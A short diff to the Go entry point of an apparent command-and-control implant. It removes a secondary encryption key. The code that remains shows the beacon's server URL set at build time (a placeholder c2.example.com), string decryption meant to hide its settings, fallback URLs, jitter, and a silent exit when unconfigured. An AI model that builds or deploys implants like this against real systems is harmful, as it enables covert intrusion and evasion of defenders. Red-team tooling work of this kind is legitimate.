@@ -14,14 +14,12 @@ import (
 // Build-time variables — ALL injected via -ldflags. No defaults.
 // An agent built without -X main.serverURL=... will exit silently (inoperable).
 var (
-	serverURL    = "" // -X main.serverURL=https://c2.example.com
-	encKey       = "" // -X main.encKey=<32-char random key>
-	secondaryKey = "" // -X main.secondaryKey=<32-char random key>
+	serverURL = "" // -X main.serverURL=https://c2.example.com
+	encKey    = "" // -X main.encKey=<32-char random key>
 
 	// Encrypted variants — set by agent-win-encrypted Makefile target.
 	serverURLEnc = ""
 	encKeyEnc    = ""
-	secKeyEnc    = ""
 	xorKeyHex    = ""
 
 	// Beacon timing
@@ -90,9 +88,6 @@ func init() {
 	if dec := strenc.Dec(encKeyEnc, key); dec != "" {
 		encKey = dec
 	}
-	if dec := strenc.Dec(secKeyEnc, key); dec != "" {
-		secondaryKey = dec
-	}
 }
 
 func main() {
@@ -135,7 +130,6 @@ func main() {
 		ServerURL:         serverURL,
 		FallbackURLs:      fallbackURLs,
 		PrimaryKey:        encKey,
-		SecondaryKey:      secondaryKey,
 		Interval:          interval,
 		JitterPercent:     jitterPct,
 		MaxRetries:        maxRetries,
